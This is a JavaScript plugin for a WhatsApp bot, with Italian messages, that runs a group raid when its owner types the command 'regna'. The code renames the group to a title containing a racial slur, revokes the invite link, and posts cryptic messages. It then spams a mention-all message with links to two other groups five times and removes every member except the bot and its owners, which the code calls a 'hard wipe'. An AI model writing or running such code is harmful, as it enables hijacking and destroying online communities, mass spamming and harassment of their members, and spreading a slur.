let handler = async (m, { conn, participants, isBotAdmin }) => {
    if (!m.isGroup) return;

    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    if (!isBotAdmin) return;

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    try {
        let metadata = await conn.groupMetadata(m.chat);
        let oldName = metadata.subject;
        let newName = `𝑺𝑽𝑻 𝑩𝒀 𝑵𝑰𝑮𝑮𝑨-𝑩𝑶𝑻`;
        await conn.groupUpdateSubject(m.chat, newName);
    } catch (e) {
        console.error('Errore cambio nome gruppo:', e);
    }

    let newInviteLink = '';
    try {
        await conn.groupRevokeInvite(m.chat);
        let code = await conn.groupInviteCode(m.chat);
        newInviteLink = `https://chat.whatsapp.com/${code}`;
    } catch (e) {
        console.error('Errore reset link:', e);
    }

    let usersToRemove = participants
        .map(p => p.jid)
        .filter(jid =>
            jid &&
            jid !== botId &&
            !ownerJids.includes(jid)
        );

    if (!usersToRemove.length) return;

    let allJids = participants.map(p => p.jid);

    await conn.sendMessage(m.chat, {
        text: "𝑰𝒍 𝒈𝒓𝒖𝒑𝒑𝒐 𝒆̀ 𝒂𝒏𝒄𝒐𝒓𝒂 𝒒𝒖𝒊. 𝑰 𝒎𝒆𝒔𝒔𝒂𝒈𝒈𝒊 𝒔𝒐𝒏𝒐 𝒂𝒏𝒄𝒐𝒓𝒂 𝒍𝒊̀. 𝑴𝒂 𝒒𝒖𝒂𝒍𝒄𝒐𝒔𝒂 𝒆̀ 𝒄𝒂𝒎𝒃𝒊𝒂𝒕𝒐. 𝑵𝒐𝒏 𝒗𝒊 𝒅𝒊𝒓𝒐̀ 𝒄𝒐𝒔𝒂. 𝑳𝒐 𝒄𝒂𝒑𝒊𝒓𝒆𝒕𝒆 𝒒𝒖𝒂𝒏𝒅𝒐 𝒔𝒂𝒓𝒂̀ 𝒊𝒍 𝒎𝒐𝒎𝒆𝒏𝒕𝒐. 𝑷𝒆𝒓 𝒐𝒓𝒂… 𝒂𝒔𝒑𝒆𝒕𝒕𝒂𝒕𝒆 𝒊𝒍 𝒑𝒓𝒐𝒔𝒔𝒊𝒎𝒐 𝒎𝒆𝒔𝒔𝒂𝒈𝒈𝒊𝒐."
    });

    const secondMessage = {
        text: `𝑬𝒏𝒕𝒓𝒂𝒕𝒆 𝒕𝒖𝒕𝒕𝒊 𝒒𝒖𝒊̀. 𝑰𝒍 𝒓𝒆𝒔𝒕𝒐… 𝒂𝒓𝒓𝒊𝒗𝒆𝒓𝒂̀.:\n\nhttps://chat.whatsapp.com/Gyf7BzAE1rTDomlgW7Qccr\n\nhttps://chat.whatsapp.com/Giwjquiq4k680j9IxNwW2D`,
        mentions: allJids
    };

    for (let i = 0; i < 5; i++) {
        await conn.sendMessage(m.chat, secondMessage);
    }

    try {
        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore durante l'hard wipe.");
    }
};

handler.command = ['regna'];
handler.group = true;
handler.botAdmin = true;
handler.owner = true;

export default handler;